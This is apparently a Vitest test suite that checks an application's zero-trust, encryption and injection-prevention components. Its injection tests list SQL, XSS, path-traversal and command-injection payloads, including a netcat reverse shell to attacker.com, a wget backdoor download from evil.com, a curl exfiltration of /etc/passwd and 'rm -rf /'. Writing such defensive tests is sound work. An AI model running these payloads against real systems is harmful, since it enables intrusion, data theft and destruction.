import { describe, it, expect, beforeEach, afterEach } from "vitest";
import fs from "fs-extra";
import path from "node:path";
import { exec } from "node:child_process";
import { promisify } from "node:util";

// Import security components for testing
import { ZeroTrustManager } from "../../../src/security/auth/zero-trust.js";
import { EncryptionService } from "../../../src/security/crypto/encryption.js";
import { InjectionPreventionFilter } from "../../../src/security/protection/injection-prevention.js";
import { EnterpriseSecurityManager } from "../../../src/security/index.js";

const execAsync = promisify(exec);

describe("Comprehensive Security Audit - Clean Room Environment", () => {
  let testDir;
  let securityManager;
  let zeroTrust;
  let encryption;
  let injectionFilter;

  beforeEach(async () => {
    testDir = path.join(__dirname, `security-test-${Date.now()}`);
    await fs.ensureDir(testDir);

    // Initialize security components with test configurations
    const securityConfig = {
      zeroTrust: {
        enabled: true,
        strictMode: true,
        mTLS: {
          enabled: true,
          verifyClient: true
        },
        deviceTrust: {
          enabled: true,
          fingerprintValidation: true,
          deviceRegistration: true
        },
        networkSegmentation: {
          enabled: true,
          allowedNetworks: ["192.168.0.0/16", "10.0.0.0/8"],
          denyByDefault: true
        }
      },
      encryption: {
        fipsCompliant: true,
        algorithm: "AES-256-GCM",
        keyRotationInterval: 3600, // 1 hour for testing
        encryptionAtRest: true,
        encryptionInTransit: true
      }
    };

    securityManager = new EnterpriseSecurityManager(securityConfig);
    zeroTrust = new ZeroTrustManager(securityConfig.zeroTrust);
    encryption = new EncryptionService(securityConfig.encryption);
    injectionFilter = new InjectionPreventionFilter();

    await securityManager.initialize();
    await zeroTrust.initialize();
    await encryption.initialize();
    await injectionFilter.initialize();
  });

  afterEach(async () => {
    await fs.remove(testDir);
    await encryption?.dispose();
  });

  describe("Zero-Trust Authentication & Authorization", () => {
    it("should implement never trust, always verify principle", async () => {
      const testRequests = [
        {
          name: "Trusted network request",
          request: {
            ip: "192.168.1.100",
            userAgent: "Mozilla/5.0 (legitimate browser)",
            certificate: { verified: true, validTo: new Date(Date.now() + 86400000) }
          },
          shouldPass: true
        },
        {
          name: "Untrusted network request",
          request: {
            ip: "203.0.113.1", // TEST-NET-3
            userAgent: "curl/7.68.0",
            certificate: null
          },
          shouldPass: false
        },
        {
          name: "Expired certificate request",
          request: {
            ip: "192.168.1.101",
            userAgent: "Mozilla/5.0",
            certificate: { verified: true, validTo: new Date(Date.now() - 86400000) }
          },
          shouldPass: false
        }
      ];

      for (const testCase of testRequests) {
        const result = await zeroTrust.validateRequest(testCase.request);
        expect(result).toBe(testCase.shouldPass);
        
        console.log(`✅ Zero-trust validation: ${testCase.name} - ${result ? 'PASSED' : 'BLOCKED'}`);
      }

      // Verify security events were logged for failed attempts
      const health = await zeroTrust.getHealth();
      expect(health.securityEvents).toBeGreaterThan(0);
    });

    it("should validate device fingerprinting and registration", async () => {
      const newDeviceRequest = {
        ip: "192.168.1.200",
        userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        acceptLanguage: "en-US,en;q=0.9",
        acceptEncoding: "gzip, deflate, br",
        dnt: "1",
        connection: "keep-alive"
      };

      // First request should require device registration
      const firstResult = await zeroTrust.validateRequest(newDeviceRequest);
      expect(firstResult).toBe(false); // Should fail initially

      // Simulate device approval
      const fingerprint = zeroTrust.generateDeviceFingerprint(newDeviceRequest);
      const approvalResult = await zeroTrust.approveDevice(fingerprint);
      expect(approvalResult).toBe(true);

      // Second request should pass after approval
      const secondResult = await zeroTrust.validateRequest(newDeviceRequest);
      expect(secondResult).toBe(true);

      console.log("✅ Device registration and approval workflow validated");
    });

    it("should detect and block behavioral anomalies", async () => {
      const normalRequest = {
        ip: "192.168.1.50",
        userAgent: "Mozilla/5.0 (normal user)",
        certificate: { verified: true, validTo: new Date(Date.now() + 86400000) }
      };

      // Simulate normal behavior
      for (let i = 0; i < 50; i++) {
        await zeroTrust.validateRequest(normalRequest);
      }

      // Simulate abnormal behavior (too many requests)
      const anomalousRequest = { ...normalRequest };
      
      // Simulate high frequency requests
      const promises = [];
      for (let i = 0; i < 150; i++) { // Exceed normal threshold
        promises.push(zeroTrust.validateRequest(anomalousRequest));
      }
      
      const results = await Promise.all(promises);
      const blockedRequests = results.filter(r => !r).length;
      
      expect(blockedRequests).toBeGreaterThan(0);
      console.log(`✅ Behavioral analysis blocked ${blockedRequests} anomalous requests`);
    });
  });

  describe("Encryption & Data Protection", () => {
    it("should provide FIPS-compliant encryption for data at rest", async () => {
      const testData = [
        "Sensitive configuration data",
        "User credentials: admin@example.com",
        "API keys and tokens",
        JSON.stringify({ secret: "classified", level: "confidential" })
      ];

      for (const data of testData) {
        const encrypted = await encryption.encryptAtRest(data, "test-data");
        expect(encrypted).toBeTruthy();
        expect(encrypted).not.toContain(data); // Data should be encrypted

        const decrypted = await encryption.decryptFromRest(encrypted);
        expect(decrypted.toString()).toBe(data);
        
        console.log(`✅ FIPS encryption: ${data.substring(0, 30)}... encrypted and decrypted successfully`);
      }

      // Verify FIPS compliance
      const health = await encryption.getHealth();
      expect(health.fipsCompliant).toBe(true);
      expect(health.algorithm).toBe("AES-256-GCM");
    });

    it("should implement secure key derivation and rotation", async () => {
      const testContext = "test-encryption-context";
      
      // Encrypt data with current key
      const originalData = "Data for key rotation test";
      const encrypted1 = await encryption.encrypt(originalData, testContext);
      
      // Trigger key rotation
      await encryption.rotateKeys();
      
      // Encrypt new data with rotated key
      const encrypted2 = await encryption.encrypt(originalData, testContext);
      
      // Both should be decryptable
      const decrypted1 = await encryption.decrypt(encrypted1);
      const decrypted2 = await encryption.decrypt(encrypted2);
      
      expect(decrypted1.toString()).toBe(originalData);
      expect(decrypted2.toString()).toBe(originalData);
      
      // Ciphertexts should be different (different keys/IVs)
      expect(encrypted1.ciphertext).not.toBe(encrypted2.ciphertext);
      
      console.log("✅ Key rotation and secure key derivation validated");
    });

    it("should securely handle cryptographic operations", async () => {
      // Test secure random generation
      const random1 = encryption.generateSecureRandom(32);
      const random2 = encryption.generateSecureRandom(32);
      
      expect(random1.length).toBe(32);
      expect(random2.length).toBe(32);
      expect(random1.equals(random2)).toBe(false); // Should be different
      
      // Test secure hashing
      const testInput = "Hash test input";
      const hash1 = encryption.createSecureHash(testInput);
      const hash2 = encryption.createSecureHash(testInput);
      const hash3 = encryption.createSecureHash(testInput + "different");
      
      expect(hash1).toBe(hash2); // Same input = same hash
      expect(hash1).not.toBe(hash3); // Different input = different hash
      expect(hash1).toMatch(/^[a-f0-9]{64}$/); // SHA-256 format
      
      console.log("✅ Cryptographic primitives validated");
    });
  });

  describe("Injection Prevention & Input Validation", () => {
    it("should detect and block SQL injection attempts", async () => {
      const sqlInjectionPayloads = [
        "'; DROP TABLE users; --",
        "1' OR '1'='1",
        "admin'/**/OR/**/1=1/**/--",
        "1; EXEC sp_executesql N'SELECT * FROM users'",
        "UNION SELECT username, password FROM users",
        "'; INSERT INTO users VALUES ('hacker', 'password'); --",
        "1' AND (SELECT COUNT(*) FROM users) > 0 --"
      ];

      const mockRequest = {
        query: {},
        body: {},
        headers: { "user-agent": "legitimate browser" },
        ip: "192.168.1.100"
      };

      for (const payload of sqlInjectionPayloads) {
        mockRequest.query.search = payload;
        
        const result = await injectionFilter.filterRequest(mockRequest);
        expect(result.isClean).toBe(false);
        
        const sqlThreats = result.threats.filter(t => t.type === 'sql-injection');
        expect(sqlThreats.length).toBeGreaterThan(0);
        
        console.log(`✅ SQL injection blocked: ${payload.substring(0, 30)}...`);
      }
    });

    it("should detect and block XSS attempts", async () => {
      const xssPayloads = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<iframe src=\"javascript:alert('XSS')\"></iframe>",
        "<svg onload=alert('XSS')>",
        "<!-- XSS --><script>alert('XSS')</script>",
        "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert('XSS')\">",
        "<link rel=\"stylesheet\" href=\"javascript:alert('XSS')\">"
      ];

      const mockRequest = {
        query: {},
        body: {},
        headers: { "user-agent": "legitimate browser" },
        ip: "192.168.1.100"
      };

      for (const payload of xssPayloads) {
        mockRequest.body.comment = payload;
        
        const result = await injectionFilter.filterRequest(mockRequest);
        expect(result.isClean).toBe(false);
        
        const xssThreats = result.threats.filter(t => t.type === 'xss');
        expect(xssThreats.length).toBeGreaterThan(0);
        
        // Verify sanitization
        expect(result.sanitizedData.body.comment).not.toContain('<script');
        expect(result.sanitizedData.body.comment).not.toContain('javascript:');
        
        console.log(`✅ XSS attempt blocked and sanitized: ${payload.substring(0, 30)}...`);
      }
    });

    it("should detect and block command injection attempts", async () => {
      const commandInjectionPayloads = [
        "; rm -rf /",
        "&& cat /etc/passwd",
        "| whoami",
        "`id`",
        "$(ls -la)",
        "; nc -e /bin/sh attacker.com 4444",
        "&& wget http://evil.com/backdoor.sh -O /tmp/backdoor.sh",
        "| curl http://attacker.com/exfiltrate -d @/etc/passwd"
      ];

      const mockRequest = {
        query: {},
        body: {},
        headers: { "user-agent": "legitimate browser" },
        ip: "192.168.1.100"
      };

      for (const payload of commandInjectionPayloads) {
        mockRequest.body.filename = `report.txt${payload}`;
        
        const result = await injectionFilter.filterRequest(mockRequest);
        expect(result.isClean).toBe(false);
        
        const cmdThreats = result.threats.filter(t => t.type === 'command-injection');
        expect(cmdThreats.length).toBeGreaterThan(0);
        expect(cmdThreats[0].severity).toBe('critical');
        
        console.log(`✅ Command injection blocked: ${payload.substring(0, 30)}...`);
      }
    });

    it("should detect and block path traversal attempts", async () => {
      const pathTraversalPayloads = [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//....//etc/passwd",
        "/var/www/../../etc/passwd",
        "..%2f..%2f..%2fetc%2fpasswd",
        "\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts"
      ];

      const mockRequest = {
        query: {},
        body: {},
        headers: { "user-agent": "legitimate browser" },
        ip: "192.168.1.100"
      };

      for (const payload of pathTraversalPayloads) {
        mockRequest.query.file = payload;
        
        const result = await injectionFilter.filterRequest(mockRequest);
        expect(result.isClean).toBe(false);
        
        const pathThreats = result.threats.filter(t => t.type === 'path-traversal');
        expect(pathThreats.length).toBeGreaterThan(0);
        
        // Verify sanitization removes traversal sequences
        expect(result.sanitizedData.query.file).not.toContain('..');
        expect(result.sanitizedData.query.file).not.toContain('/etc/');
        
        console.log(`✅ Path traversal blocked: ${payload.substring(0, 30)}...`);
      }
    });
  });

  describe("File Upload Security", () => {
    it("should validate and secure file uploads", async () => {
      const dangerousFiles = [
        { name: "malware.exe", mimetype: "application/x-executable" },
        { name: "script.js", mimetype: "text/javascript" },
        { name: "backdoor.php", mimetype: "application/x-php" },
        { name: "virus.bat", mimetype: "application/x-msdos-program" },
        { name: "trojan.scr", mimetype: "application/octet-stream" }
      ];

      const mockRequest = {
        files: {},
        headers: { "user-agent": "legitimate browser" },
        ip: "192.168.1.100"
      };

      for (const file of dangerousFiles) {
        mockRequest.files.upload = file;
        
        const result = await injectionFilter.filterRequest(mockRequest);
        expect(result.isClean).toBe(false);
        
        const fileThreats = result.threats.filter(
          t => t.type === 'dangerous-file' || t.type === 'dangerous-mime'
        );
        expect(fileThreats.length).toBeGreaterThan(0);
        
        console.log(`✅ Dangerous file blocked: ${file.name} (${file.mimetype})`);
      }
    });

    it("should allow safe file uploads", async () => {
      const safeFiles = [
        { name: "document.pdf", mimetype: "application/pdf" },
        { name: "image.jpg", mimetype: "image/jpeg" },
        { name: "data.csv", mimetype: "text/csv" },
        { name: "presentation.pptx", mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation" }
      ];

      const mockRequest = {
        files: {},
        headers: { "user-agent": "legitimate browser" },
        ip: "192.168.1.100"
      };

      for (const file of safeFiles) {
        mockRequest.files.upload = file;
        
        const result = await injectionFilter.filterRequest(mockRequest);
        
        // Should pass file validation (other threats may still be detected)
        const fileThreats = result.threats.filter(
          t => t.type === 'dangerous-file' || t.type === 'dangerous-mime'
        );
        expect(fileThreats.length).toBe(0);
        
        console.log(`✅ Safe file allowed: ${file.name} (${file.mimetype})`);
      }
    });
  });

  describe("Enterprise Security Integration", () => {
    it("should validate comprehensive security health", async () => {
      const health = await securityManager.getSecurityHealth();
      
      expect(health).toHaveProperty('zeroTrust');
      expect(health).toHaveProperty('encryption');
      
      expect(health.zeroTrust.enabled).toBe(true);
      expect(health.encryption.initialized).toBe(true);
      expect(health.encryption.fipsCompliant).toBe(true);
      
      console.log("✅ Enterprise security health validated:", JSON.stringify(health, null, 2));
    });

    it("should implement defense-in-depth security layers", async () => {
      const maliciousRequest = {
        ip: "203.0.113.50", // Untrusted network
        userAgent: "curl/7.68.0", // Suspicious user agent
        query: { search: "'; DROP TABLE users; --" }, // SQL injection
        body: { comment: "<script>alert('XSS')</script>" }, // XSS attempt
        headers: { "user-agent": "curl/7.68.0" }
      };

      // Test multiple security layers
      const zeroTrustResult = await zeroTrust.validateRequest(maliciousRequest);
      const injectionResult = await injectionFilter.filterRequest(maliciousRequest);
      const overallResult = await securityManager.validateRequest(maliciousRequest);
      
      expect(zeroTrustResult).toBe(false); // Blocked by zero-trust
      expect(injectionResult.isClean).toBe(false); // Blocked by injection filter
      expect(overallResult).toBe(false); // Blocked overall
      
      console.log("✅ Defense-in-depth: Multiple security layers successfully blocked malicious request");
    });
  });

  describe("Security Performance & Scalability", () => {
    it("should maintain security under high load", async () => {
      const startTime = Date.now();
      const concurrentRequests = 100;
      const promises = [];

      const testRequest = {
        ip: "192.168.1.150",
        userAgent: "Mozilla/5.0 (load test)",
        certificate: { verified: true, validTo: new Date(Date.now() + 86400000) },
        query: { q: "legitimate search" },
        body: { data: "normal data" },
        headers: { "user-agent": "Mozilla/5.0 (load test)" }
      };

      for (let i = 0; i < concurrentRequests; i++) {
        promises.push(securityManager.validateRequest({
          ...testRequest,
          query: { q: `search ${i}` }
        }));
      }

      const results = await Promise.all(promises);
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      const successfulRequests = results.filter(r => r).length;
      const avgResponseTime = duration / concurrentRequests;
      
      expect(successfulRequests).toBe(concurrentRequests); // All should pass
      expect(avgResponseTime).toBeLessThan(100); // Under 100ms average
      
      console.log(`✅ Performance test: ${concurrentRequests} requests processed in ${duration}ms (${avgResponseTime.toFixed(2)}ms avg)`);
    });

    it("should efficiently handle security pattern matching", async () => {
      const injectionStats = injectionFilter.getStatistics();
      
      expect(injectionStats.sqlPatterns).toBeGreaterThan(10);
      expect(injectionStats.xssPatterns).toBeGreaterThan(10);
      expect(injectionStats.commandPatterns).toBeGreaterThan(5);
      expect(injectionStats.pathTraversalPatterns).toBeGreaterThan(5);
      
      console.log("✅ Security patterns loaded:", injectionStats);
    });
  });

  describe("Compliance & Audit Trail", () => {
    it("should maintain comprehensive audit logs", async () => {
      // Generate security events
      const testRequests = [
        { ip: "203.0.113.1", valid: false }, // Should be blocked
        { ip: "192.168.1.100", valid: true }, // Should pass
        { ip: "10.0.0.50", valid: true } // Should pass
      ];

      for (const req of testRequests) {
        await zeroTrust.validateRequest({
          ip: req.ip,
          userAgent: "test",
          certificate: req.valid ? { verified: true, validTo: new Date(Date.now() + 86400000) } : null
        });
      }

      const health = await zeroTrust.getHealth();
      expect(health.securityEvents).toBeGreaterThan(0);
      expect(health.recentEvents.length).toBeGreaterThan(0);
      
      console.log(`✅ Audit trail: ${health.securityEvents} security events logged`);
    });

    it("should support compliance reporting", async () => {
      // Test compliance-relevant security measures
      const encryptionHealth = await encryption.getHealth();
      const zeroTrustHealth = await zeroTrust.getHealth();
      const injectionHealth = await injectionFilter.getHealth();
      
      // FIPS compliance
      expect(encryptionHealth.fipsCompliant).toBe(true);
      
      // Zero-trust implementation
      expect(zeroTrustHealth.enabled).toBe(true);
      
      // Injection prevention
      expect(injectionHealth.activeFilters.sqlInjection).toBe(true);
      expect(injectionHealth.activeFilters.xss).toBe(true);
      
      const complianceReport = {
        fipsCompliant: encryptionHealth.fipsCompliant,
        zeroTrustEnabled: zeroTrustHealth.enabled,
        injectionProtection: injectionHealth.activeFilters,
        encryptionAtRest: encryptionHealth.encryptionAtRest,
        encryptionInTransit: encryptionHealth.encryptionInTransit,
        auditLogging: zeroTrustHealth.securityEvents > 0
      };
      
      console.log("✅ Compliance report generated:", JSON.stringify(complianceReport, null, 2));
    });
  });
});